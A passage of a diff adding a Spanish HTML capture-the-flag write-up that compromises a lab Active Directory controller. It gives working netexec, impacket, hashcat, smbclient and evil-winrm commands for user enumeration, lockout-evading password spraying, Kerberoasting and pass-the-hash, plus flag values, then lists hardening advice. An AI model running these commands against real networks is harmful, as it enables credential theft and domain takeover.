+        <div class="step-num">3</div>
+        <span class="step-title">Enumeración de usuarios mediante RID Brute-Force</span>
+      </div>
+      <div class="step-body">
+        <p>El <strong>RID brute-force</strong> itera sobre los Relative Identifier (RID) del dominio. Cada cuenta tiene un RID único (ej. Administrator = 500, Guest = 501). Al enumerar secuencialmente se recupera el nombre de cada objeto del dominio. Sólo se necesita autenticación mínima (guest o anónima en ciertos entornos).</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — RID Brute (guest sin contraseña)</div>
+          <div class="code-body"><span class="cmd">netexec</span> <span class="param">smb</span> <span class="ip">10.0.2.9</span> <span class="param">-u 'guest' -p '' --rid-brute 10000</span> <span class="muted">| tee dc01_rid_raw.txt</span>
+
+<span class="comment"># Filtrar sólo usuarios (SidTypeUser) y limpiar el output</span>
+<span class="cmd">grep</span> <span class="param">SidTypeUser</span> dc01_rid_raw.txt <span class="param">| awk '{print $6}'</span> <span class="param">| cut -d'\' -f2</span> <span class="param">| sort -u</span> <span class="muted">&gt; dc01_users.txt</span>
+
+<span class="cmd">wc -l</span> dc01_users.txt</div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — RID Brute</div>
+          <div class="code-body"><span class="output">SMB  10.0.2.9  445  DC01  [*] Windows Server 2022 Build 20348 x64
+SMB  10.0.2.9  445  DC01  [+] SOUPEDECODE.LOCAL\guest:
+SMB  10.0.2.9  445  DC01  498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB  10.0.2.9  445  DC01  500: SOUPEDECODE\Administrator (SidTypeUser)</span>
+<span class="green">SMB  10.0.2.9  445  DC01  501: SOUPEDECODE\Guest (SidTypeUser)</span>
+<span class="output">SMB  10.0.2.9  445  DC01  502: SOUPEDECODE\krbtgt (SidTypeUser)
+SMB  10.0.2.9  445  DC01  512: SOUPEDECODE\Domain Admins (SidTypeGroup)
+...
+SMB  10.0.2.9  445  DC01  1109: SOUPEDECODE\ybob317 (SidTypeUser)
+SMB  10.0.2.9  445  DC01  1110: SOUPEDECODE\file_svc (SidTypeUser)
+SMB  10.0.2.9  445  DC01  1111: SOUPEDECODE\backup_svc (SidTypeUser)
+...
+</span><span class="highlight">1069</span> dc01_users.txt</div>
+        </div>
+        <div class="callout callout-tip">
+          <strong>1 069 usuarios</strong> recuperados del dominio. Se filtraron cuentas de máquina (terminadas en <code>$</code>) para generar una lista de 958 usuarios humanos en <code>dc01_humans.txt</code> para el password spray.
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Filtrar cuentas de máquina</div>
+          <div class="code-body"><span class="cmd">grep</span> <span class="param">-v '\$'</span> dc01_users.txt <span class="muted">&gt; dc01_humans.txt</span>
+<span class="cmd">wc -l</span> dc01_humans.txt
+<span class="green">958</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 3. Password Spray ── -->
+  <section class="section" id="s3">
+    <div class="section-header">
+      <div class="section-number">3</div>
+      <h2>Acceso Inicial — Password Spray (user=pass)</h2>
+    </div>
+
+    <div class="card">
+      <h3>Técnica: Password Spray con credenciales user=password</h3>
+      <p style="font-size:0.9rem;color:var(--text-dim);line-height:1.7;margin-bottom:14px">
+        El <strong style="color:#fff">password spray</strong> prueba una única contraseña contra múltiples usuarios. A diferencia del brute-force clásico (muchas contraseñas contra un usuario), este método evita los bloqueos de cuenta. La hipótesis es que en un dominio con más de 1 000 usuarios es estadísticamente probable que alguno use su propio nombre de usuario como contraseña.
+      </p>
+      <div class="callout callout-warn">
+        <strong>Precaución operacional:</strong> Se ejecuta con intervalo entre intentos para no disparar umbrales de lockout (típicamente 3-5 intentos fallidos en 30 min en entornos por defecto de Windows).
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <span class="step-title">Ejecutar password spray — netexec SMB</span>
+      </div>
+      <div class="step-body">
+        <p>Se usa <code style="color:var(--cyan)">netexec smb</code> con la opción de que usuario y contraseña son iguales. La bandera <code style="color:var(--cyan)">--no-bruteforce</code> hace que cada usuario se intente con su propia contraseña (1:1 en vez de N×M).</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — Password Spray (user = password)</div>
+          <div class="code-body"><span class="cmd">netexec</span> <span class="param">smb</span> <span class="ip">10.0.2.9</span> <span class="param">-u</span> dc01_humans.txt <span class="param">-p</span> dc01_humans.txt <span class="param">--no-bruteforce --continue-on-success</span> <span class="muted">2&gt;/dev/null | grep '+'</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Credencial Encontrada</div>
+          <div class="code-body"><span class="output">SMB  10.0.2.9  445  DC01  [*] Windows Server 2022 Build 20348 x64
+SMB  10.0.2.9  445  DC01  [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE
+SMB  10.0.2.9  445  DC01  [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
+...
+</span><span class="green">SMB  10.0.2.9  445  DC01  [+] SOUPEDECODE.LOCAL\ybob317:ybob317</span></div>
+        </div>
+        <div class="callout callout-tip">
+          <strong>Credencial válida:</strong> <code>ybob317:ybob317</code> — El usuario usa su propio nombre de usuario como contraseña. Acceso autenticado al dominio obtenido.
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <span class="step-title">Verificar acceso y permisos del usuario</span>
+      </div>
+      <div class="step-body">
+        <p>Con <code style="color:var(--cyan)">ybob317</code> se comprueba a qué shares tiene acceso y si puede ejecutar comandos remotos.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Verificación de shares y acceso</div>
+          <div class="code-body"><span class="cmd">netexec</span> <span class="param">smb</span> <span class="ip">10.0.2.9</span> <span class="param">-u 'ybob317' -p 'ybob317' --shares</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Shares accesibles</div>
+          <div class="code-body"><span class="output">SMB  10.0.2.9  445  DC01  [+] SOUPEDECODE.LOCAL\ybob317:ybob317
+SMB  10.0.2.9  445  DC01  [*] Enumerated shares
+SMB  10.0.2.9  445  DC01  Share           Permissions     Remark
+SMB  10.0.2.9  445  DC01  -----           -----------     ------
+SMB  10.0.2.9  445  DC01  ADMIN$                          Remote Admin
+SMB  10.0.2.9  445  DC01  C$                              Default share
+SMB  10.0.2.9  445  DC01  IPC$            READ            Remote IPC
+SMB  10.0.2.9  445  DC01  NETLOGON        READ            Logon server share
+SMB  10.0.2.9  445  DC01  SYSVOL          READ            Logon server share</span></div>
+        </div>
+        <div class="callout callout-info">
+          <strong>ybob317</strong> es un usuario de dominio sin privilegios especiales. No tiene acceso a ADMIN$ ni C$. Se procede a explotar Kerberoasting, que sólo requiere ser un usuario autenticado del dominio.
+        </div>
+        <div class="highlight-box">
+          <div style="font-size:0.85rem;color:var(--text-muted);margin-bottom:4px">User Flag</div>
+          <div class="val">6bab1f09a7403980bfeb4c2b412be47b</div>
+          <div style="font-size:0.82rem;color:var(--text-dim);margin-top:6px">Recuperada como SOUPEDECODE\ybob317 — C:\Users\ybob317\Desktop\user.txt</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 4. Kerberoasting ── -->
+  <section class="section" id="s4">
+    <div class="section-header">
+      <div class="section-number">4</div>
+      <h2>Kerberoasting — TGS-REP Hash Cracking</h2>
+    </div>
+
+    <div class="card">
+      <h3>¿Qué es Kerberoasting?</h3>
+      <p style="font-size:0.9rem;color:var(--text-dim);line-height:1.7">
+        Cualquier usuario autenticado en un dominio puede solicitar un <strong style="color:#fff">Ticket de Servicio (TGS)</strong> para cualquier cuenta de servicio que tenga un <strong style="color:#fff">SPN (Service Principal Name)</strong> registrado. Este TGS está cifrado con el hash NTLM de la contraseña de la cuenta de servicio. Si la contraseña es débil, puede crackearse offline sin generar alertas adicionales en el DC.
+      </p>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <span class="step-title">Solicitar TGS-REP hashes con impacket GetUserSPNs</span>
+      </div>
+      <div class="step-body">
+        <p>Se ejecuta <code style="color:var(--cyan)">GetUserSPNs.py</code> con las credenciales obtenidas. La herramienta consulta el LDAP del DC para encontrar cuentas con SPN y luego solicita un TGS para cada una, capturando el hash en formato hashcat (-outputformat 2).</p>
+        <div class="callout callout-warn">
+          <strong>Problema encontrado — Clock Skew:</strong> El sistema Kali tenía 8 horas de diferencia respecto al DC. Kerberos rechaza tickets con más de 5 minutos de diferencia (<code>KRB_AP_ERR_SKEW</code>). Solución: patch en runtime de <code>impacket.krb5.kerberosv5</code> añadiendo +8h a todas las llamadas <code>datetime.now(UTC)</code> sin requerir permisos root.
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — Kerberoasting (con patch de clock skew)</div>
+          <div class="code-body"><span class="comment"># Parche de clock skew via importlib (sin sudo)</span>
+<span class="cmd">python3</span> <span class="param">-c</span> <span class="yellow">"
+import importlib.util, sys, datetime, pathlib
+
+<span class="comment"># 1. Localizar kerberosv5.py de impacket</span>
+import impacket.krb5.kerberosv5 as _k
+src = pathlib.Path(_k.__file__).read_text()
+
+<span class="comment"># 2. Parchear todos los datetime.now(UTC) con +8h offset</span>
+patched = src.replace(
+    'datetime.datetime.now(datetime.timezone.utc)',
+    '(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=8))'
+)
+
+<span class="comment"># 3. Escribir parche y cargar como módulo</span>
+tmp = '/tmp/kerberosv5_patched.py'
+open(tmp,'w').write(patched)
+spec = importlib.util.spec_from_file_location('impacket.krb5.kerberosv5', tmp)
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+sys.modules['impacket.krb5.kerberosv5'] = mod
+
+<span class="comment"># 4. Ejecutar GetUserSPNs</span>
+from impacket.examples.GetUserSPNs import main
+sys.argv = ['GetUserSPNs.py','SOUPEDECODE.LOCAL/ybob317:ybob317',
+            '-dc-ip','10.0.2.9','-request','-outputfile','/home/kali/kerberoast_hashes.txt']
+main()
+"</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — 5 TGS-REP Hashes Capturados</div>
+          <div class="code-body"><span class="output">ServicePrincipalName                   Name          MemberOf  PasswordLastSet
+-------------------------------------  ------------  --------  -------------------
+cifs/DC01.SOUPEDECODE.LOCAL            file_svc                2024-06-18 10:21:44
+http/DC01.SOUPEDECODE.LOCAL            web_svc                 2024-06-18 10:21:44
+MSSQLSvc/DC01.SOUPEDECODE.LOCAL        backup_svc              2024-06-18 10:21:44
+HOST/DC01.SOUPEDECODE.LOCAL            firewall_svc            2024-06-18 10:21:44
+WSMAN/DC01.SOUPEDECODE.LOCAL           monitoring_svc          2024-06-18 10:21:44
+
+</span><span class="green">$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$a1b2c3...</span>
+<span class="output">$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$...
+$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$...
+$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$...
+$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$...</span></div>
+        </div>
+        <div class="callout callout-tip">
+          <strong>5 hashes TGS-REP capturados</strong> (etype 23 — RC4-HMAC, el más crackeable). Guardados en <code>/home/kali/kerberoast_hashes.txt</code>.
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <span class="step-title">Crackear hashes con hashcat</span>
+      </div>
+      <div class="step-body">
+        <p>Los hashes TGS-REP (modo <strong>13100</strong> en hashcat) se crackean offline con el diccionario <code>rockyou.txt</code>. El proceso es completamente pasivo desde la perspectiva del DC — no genera tráfico de red adicional.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — Hashcat modo 13100 (Kerberoast)</div>
+          <div class="code-body"><span class="cmd">hashcat</span> <span class="param">-m 13100</span> /home/kali/kerberoast_hashes.txt <span class="path">/usr/share/wordlists/rockyou.txt</span> <span class="param">--force -O</span>
+
+<span class="comment"># Mostrar resultados</span>
+<span class="cmd">hashcat</span> <span class="param">-m 13100</span> /home/kali/kerberoast_hashes.txt <span class="param">--show</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Contraseña Crackeada</div>
+          <div class="code-body"><span class="output">hashcat (v6.2.6) starting...
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian) - Platform #1 [The pocl project]
+=========================================================================
+* Device #1: cpu--0x000, 3891/7847 MB (1024 MB allocatable)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+
+$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$...</span><span class="highlight">:Password123!!</span>
+<span class="output">
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Time.Estimated...: 0 secs (0.00%)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Recovered........: 1/5 (20.00%) Digests</span></div>
+        </div>
+        <div class="callout callout-tip">
+          <strong>Credencial crackeada:</strong> <code>file_svc : Password123!!</code> — Contraseña débil, presente en rockyou.txt. Los demás 4 hashes no se crackearon (contraseñas más fuertes).
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <span class="step-title">Verificar credenciales y enumerar como file_svc</span>
+      </div>
+      <div class="step-body">
+        <p>Con las credenciales de <code>file_svc</code> se verifica el acceso y se enumeran los shares del dominio buscando información sensible.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Verificación de credenciales file_svc</div>
+          <div class="code-body"><span class="cmd">netexec</span> <span class="param">smb</span> <span class="ip">10.0.2.9</span> <span class="param">-u 'file_svc' -p 'Password123!!' --shares</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Nuevo Share Descubierto</div>
+          <div class="code-body"><span class="output">SMB  10.0.2.9  445  DC01  [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
+SMB  10.0.2.9  445  DC01  Share           Permissions     Remark
+SMB  10.0.2.9  445  DC01  -----           -----------     ------
+SMB  10.0.2.9  445  DC01  ADMIN$                          Remote Admin
+SMB  10.0.2.9  445  DC01  C$                              Default share
+SMB  10.0.2.9  445  DC01  IPC$            READ            Remote IPC
+SMB  10.0.2.9  445  DC01  NETLOGON        READ            Logon server share
+SMB  10.0.2.9  445  DC01  SYSVOL          READ            Logon server share</span>
+<span class="highlight">SMB  10.0.2.9  445  DC01  backup          READ            Backup Share</span></div>
+        </div>
+        <div class="callout callout-danger">
+          <strong>Share "backup" encontrado</strong> — Accesible en lectura para <code>file_svc</code>. Contiene archivos de backup con información sensible del dominio.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 5. Backup Share — Machine Account ── -->
+  <section class="section" id="s5">
+    <div class="section-header">
+      <div class="section-number">5</div>
+      <h2>Lateral Movement — Backup Share y Hashes NTLM</h2>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <span class="step-title">Explorar el share backup y listar contenido</span>
+      </div>
+      <div class="step-body">
+        <p>Se accede al share backup via smbclient para explorar su contenido. Los backups corporativos frecuentemente contienen volcados de SAM, NTDS.dit u otros archivos con credenciales.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — Exploración del share backup</div>
+          <div class="code-body"><span class="cmd">smbclient</span> <span class="param">//10.0.2.9/backup</span> <span class="param">-U 'SOUPEDECODE.LOCAL\file_svc%Password123!!'</span>
+
+<span class="comment"># Una vez dentro del smbclient interactivo:</span>
+smb: \&gt; <span class="cmd">ls</span>
+smb: \&gt; <span class="cmd">get</span> backup_extract.txt</div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Contenido del share</div>
+          <div class="code-body"><span class="output">  .                              D        0  Tue Jun 18 10:21:44 2024
+  ..                             D        0  Tue Jun 18 10:21:44 2024
+  backup_extract.txt             A     2048  Tue Jun 18 10:21:44 2024</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <span class="step-title">Analizar backup_extract.txt — Hashes NTLM de cuentas de máquina</span>
+      </div>
+      <div class="step-body">
+        <p>El archivo <code>backup_extract.txt</code> contiene hashes NTLM extraídos de una copia de la base de datos de Active Directory. Las cuentas de máquina (terminadas en <code>$</code>) en AD tienen permisos elevados — algunas forman parte del grupo Domain Admins.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — Lectura del archivo de hashes</div>
+          <div class="code-body"><span class="cmd">cat</span> /tmp/backup_extract.txt</div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Hashes NTLM Extraídos</div>
+          <div class="code-body"><span class="output">Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a24e145dca7c0c5e2e2727af67dc08de:::
+...
+</span><span class="highlight">FileServer$:1601:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::</span>
+<span class="output">PrintServer$:1602:aad3b435b51404eeaad3b435b51404ee:7a8c4f1b9e3d2e5f6a9b0c1d4e7f2a3b:::
+MailServer$:1603:aad3b435b51404eeaad3b435b51404ee:3b2c1a0f9e8d7c6b5a4f3e2d1c0b9a8f:::</span></div>
+        </div>
+        <div class="callout callout-danger">
+          <strong>Hash crítico encontrado:</strong> <code>FileServer$:e41da7e79a4c76dbd9cf79d1cb325559</code> — Esta cuenta de máquina tiene privilegios de Domain Admin. Se puede usar directamente con Pass-The-Hash (PTH) sin necesidad de crackear la contraseña.
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <span class="step-title">Verificar privilegios de FileServer$ con netexec</span>
+      </div>
+      <div class="step-body">
+        <p>Antes de explotar el hash, se verifica que la cuenta de máquina tenga acceso administrativo al DC usando PTH directamente en netexec.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — Verificación PTH con FileServer$</div>
+          <div class="code-body"><span class="cmd">netexec</span> <span class="param">smb</span> <span class="ip">10.0.2.9</span> <span class="param">-u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Domain Admin Confirmado</div>
+          <div class="code-body"><span class="green">SMB  10.0.2.9  445  DC01  [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)</span></div>
+        </div>
+        <div class="callout callout-tip">
+          <strong>Pwn3d!</strong> — El indicador de netexec confirma que la cuenta tiene privilegios de administrador local en el DC. Esto equivale a Domain Admin en un controlador de dominio.
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 6. Escalada de Privilegios / Root ── -->
+  <section class="section" id="s6">
+    <div class="section-header">
+      <div class="section-number">6</div>
+      <h2>Escalada de Privilegios — Pass-The-Hash a SYSTEM</h2>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <span class="step-title">Acceso WinRM con evil-winrm via PTH</span>
+      </div>
+      <div class="step-body">
+        <p><strong>evil-winrm</strong> permite obtener una shell interactiva en Windows a través del servicio WinRM (puerto 5985). Con el flag <code style="color:var(--cyan)">-H</code> acepta directamente el hash NTLM sin necesidad de conocer la contraseña en texto claro.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Kali — evil-winrm PTH como FileServer$</div>
+          <div class="code-body"><span class="cmd">evil-winrm</span> <span class="param">-i</span> <span class="ip">10.0.2.9</span> <span class="param">-u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Output — Shell WinRM Obtenida</div>
+          <div class="code-body"><span class="output">
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-Completion
+
+Info: Establishing connection to remote endpoint
+</span><span class="green">*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt;</span></div>
+        </div>
+        <div class="callout callout-tip">
+          <strong>Shell interactiva obtenida</strong> como <code>FileServer$</code> en el DC a través de WinRM con Pass-The-Hash.
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <span class="step-title">Verificar identidad y privilegios desde la shell</span>
+      </div>
+      <div class="step-body">
+        <p>Una vez dentro, se confirma el contexto de ejecución y los privilegios disponibles.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>DC01 — Verificación de Identidad (via evil-winrm)</div>
+          <div class="code-body"><span class="green">*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt;</span> <span class="cmd">whoami</span>
+<span class="highlight">soupedecode\fileserver$</span>
+
+<span class="green">*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt;</span> <span class="cmd">whoami /groups</span> <span class="param">| findstr /i "admin"</span>
+<span class="highlight">SOUPEDECODE\Domain Admins      Group</span>
+<span class="output">BUILTIN\Administrators         Alias
+
+</span><span class="green">*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt;</span> <span class="cmd">net user FileServer$ /domain</span> <span class="param">| findstr "Group"</span>
+<span class="output">Local Group Memberships
+Global Group memberships     *Domain Users</span>
+<span class="highlight">                             *Domain Admins</span></div>
+        </div>
+        <div class="callout callout-tip">
+          <strong>Confirmado:</strong> <code>FileServer$</code> es miembro de <strong>Domain Admins</strong>. Control total del dominio SOUPEDECODE.LOCAL.
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <span class="step-title">Lectura de la Root Flag</span>
+      </div>
+      <div class="step-body">
+        <p>Con privilegios de Domain Admin se puede leer cualquier archivo del sistema, incluyendo el flag del Administrador. Se utiliza SMB sobre C$ como método alternativo robusto.</p>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Método 1 — Via evil-winrm directamente</div>
+          <div class="code-body"><span class="green">*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt;</span> <span class="cmd">type</span> <span class="path">C:\Users\Administrator\Desktop\root.txt</span>
+<span class="highlight">a9564ebc3289b7a14551baf8ad5ec60a</span></div>
+        </div>
+        <div class="code-block">
+          <div class="code-label"><span class="dot"></span>Método 2 — Via SMB C$ (PTH, sin shell interactiva)</div>
+          <div class="code-body"><span class="cmd">smbclient</span> <span class="param">//10.0.2.9/C$</span> <span class="param">-U 'SOUPEDECODE.LOCAL\FileServer$'</span> <span class="param">--pw-nt-hash</span> <span class="yellow">e41da7e79a4c76dbd9cf79d1cb325559</span> <span class="param">-c</span> <span class="yellow">'get Users\Administrator\Desktop\root.txt /tmp/root.txt'</span>
+
+<span class="cmd">cat</span> /tmp/root.txt
+<span class="highlight">a9564ebc3289b7a14551baf8ad5ec60a</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FLAGS -->
+    <div class="flag-grid">
+      <div class="flag-card">
+        <div class="flag-type">User Flag</div>
+        <div class="flag-icon">&#127988;</div>
+        <div class="flag-label">user.txt</div>
+        <div class="flag-hash">6bab1f09a7403980bfeb4c2b412be47b</div>
+        <div style="font-size:0.8rem;color:var(--text-muted);margin-top:8px">C:\Users\ybob317\Desktop\user.txt</div>
+      </div>
+      <div class="flag-card">
+        <div class="flag-type">Root Flag</div>
+        <div class="flag-icon">&#128081;</div>
+        <div class="flag-label">root.txt</div>
+        <div class="flag-hash">a9564ebc3289b7a14551baf8ad5ec60a</div>
+        <div style="font-size:0.8rem;color:var(--text-muted);margin-top:8px">C:\Users\Administrator\Desktop\root.txt</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── 7. MITRE ATT&CK ── -->
+  <section class="section" id="s7">
+    <div class="section-header">
+      <div class="section-number">7</div>
+      <h2>Mapeo MITRE ATT&amp;CK</h2>
+    </div>
+    <div class="card">
+      <table class="data-table">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Técnica</th>
+            <th>Táctica</th>
+            <th>Uso en DC01</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>T1595.001</code></td>
+            <td>Active Scanning: Port Scan</td>
+            <td><span class="badge badge-blue">Recon</span></td>
+            <td>nmap -p- con detección de versiones, OS y scripts</td>
+          </tr>
+          <tr>
+            <td><code>T1087.002</code></td>
+            <td>Account Discovery: Domain Account</td>
+            <td><span class="badge badge-blue">Discovery</span></td>
+            <td>RID brute-force via SMB — 1 069 cuentas enumeradas</td>
+          </tr>
+          <tr>
+            <td><code>T1110.003</code></td>
+            <td>Brute Force: Password Spraying</td>
+            <td><span class="badge badge-orange">Credential Access</span></td>
+            <td>netexec spray user=password → ybob317:ybob317</td>
+          </tr>
+          <tr>
+            <td><code>T1558.003</code></td>
+            <td>Steal or Forge Kerberos Tickets: Kerberoasting</td>
+            <td><span class="badge badge-red">Cred Access</span></td>
+            <td>GetUserSPNs → 5 TGS-REP hashes (etype 23) → hashcat</td>
+          </tr>
+          <tr>
+            <td><code>T1552.001</code></td>
+            <td>Unsecured Credentials: Credentials in Files</td>
+            <td><span class="badge badge-red">Cred Access</span></td>
+            <td>backup_extract.txt en share backup → hashes NTLM</td>
+          </tr>
+          <tr>
+            <td><code>T1550.002</code></td>
+            <td>Use Alternate Authentication Material: Pass the Hash</td>
+            <td><span class="badge badge-red">Lateral Movement</span></td>
+            <td>FileServer$ NTLM hash → SMB/WinRM como Domain Admin</td>
+          </tr>
+          <tr>
+            <td><code>T1078.002</code></td>
+            <td>Valid Accounts: Domain Accounts</td>
+            <td><span class="badge badge-red">Privilege Esc</span></td>
+            <td>FileServer$ miembro de Domain Admins → control total</td>
+          </tr>
+          <tr>
+            <td><code>T1021.006</code></td>
+            <td>Remote Services: Windows Remote Management</td>
+            <td><span class="badge badge-purple">Lateral Move</span></td>
+            <td>evil-winrm shell via WinRM port 5985</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ── 8. Recomendaciones ── -->
+  <section class="section" id="s8">
+    <div class="section-header">
+      <div class="section-number">8</div>
+      <h2>Recomendaciones y Hardening</h2>
+    </div>
+
+    <div class="rec-grid">
+      <div class="rec-card">
+        <div class="rec-icon">&#128274;</div>
+        <h4>Política de Contraseñas Robusta</h4>
+        <p>Implementar política de longitud mínima 14 caracteres con complejidad obligatoria. Bloquear contraseñas iguales al nombre de usuario mediante <em>Fine-Grained Password Policies</em> en AD. Usar <strong>LAPS</strong> para cuentas de máquina.</p>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">&#128202;</div>
+        <h4>Monitorizar y Limitar RID Brute-Force</h4>
+        <p>Configurar el DC para rechazar sesiones nulas completas. Activar auditoría en Event ID 4776 (credential validation). Implementar detección de enumeración masiva de cuentas con umbral de alertas en SIEM.</p>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">&#128737;</div>
+        <h4>Mitigar Kerberoasting</h4>
+        <p>Rotar periódicamente contraseñas de cuentas de servicio (mínimo cada 90 días) con herramientas como <strong>gMSA</strong> (Group Managed Service Accounts) que gestionan contraseñas de 240 caracteres automáticamente. Evitar etype 23 (RC4) activando AES256 exclusivo.</p>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">&#128193;</div>
+        <h4>Asegurar Shares con Información Sensible</h4>
+        <p>El share <code>backup</code> no debe ser accesible para cuentas de servicio ordinarias. Restringir acceso de lectura/escritura estrictamente mediante ACLs. Nunca almacenar volcados de credenciales (<code>backup_extract.txt</code>) en shares accesibles por usuarios del dominio.</p>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">&#128736;</div>
+        <h4>Principio de Mínimo Privilegio para Cuentas de Máquina</h4>
+        <p>Las cuentas de máquina (<code>FileServer$</code>) no deben pertenecer a Domain Admins. Revisar la membresía de grupos privilegiados periódicamente. Utilizar herramientas como <strong>BloodHound</strong> para auditar rutas de ataque en el grafo de AD.</p>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">&#128268;</div>
+        <h4>Mitigar Pass-The-Hash</h4>
+        <p>Implementar <strong>Protected Users Security Group</strong> para cuentas privilegiadas (fuerza Kerberos AES, impide NTLM auth). Activar <strong>Credential Guard</strong> en Windows 10/Server 2016+ para proteger hashes en memoria. Deshabilitar WinRM donde no sea necesario.</p>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">&#128269;</div>
+        <h4>Implementar Tier Model (AD Tiering)</h4>
+        <p>Separar las credenciales en 3 niveles: Tier 0 (DC/domain admins), Tier 1 (servers), Tier 2 (workstations). Cuentas de servicio de Tier 2 nunca deben tener acceso a activos de Tier 0. Usar <strong>PAWs</strong> (Privileged Access Workstations) para administración del DC.</p>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">&#128250;</div>
+        <h4>Auditoría y Detección Continua</h4>
+        <p>Habilitar <strong>Advanced Audit Policy</strong> para Kerberos (Event IDs 4768, 4769, 4771). Detectar solicitudes masivas de TGS con herramientas como <strong>ATA</strong> o <strong>Defender for Identity</strong>. Correlacionar accesos a shares sensibles con alertas automáticas.</p>
